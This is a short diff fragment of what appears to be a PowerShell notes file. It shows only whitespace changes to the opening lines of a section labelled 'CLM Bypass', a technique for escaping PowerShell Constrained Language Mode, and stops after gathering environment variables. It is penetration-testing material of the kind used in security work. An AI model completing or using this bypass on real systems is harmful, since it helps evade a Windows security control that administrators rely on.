@@ -12,9 +12,9 @@ $ExecutionContext.SessionState.LanguageMode
 
 If you get a 200 back you're all good.
 
-CLM Bypass
-		#Path to Powershell
-		$CMDLine = "$PSHOMEpowershell.exe"
+CLM Bypass   
+	#Path to Powershell
+	$CMDLine = "$PSHOMEpowershell.exe"
 
 	#Getting existing env vars
 	[String[]] $EnvVarsExceptTemp = Get-ChildItem Env:* -Exclude "TEMP","TMP"| % { "$($_.Name)=$($_.Value)" }
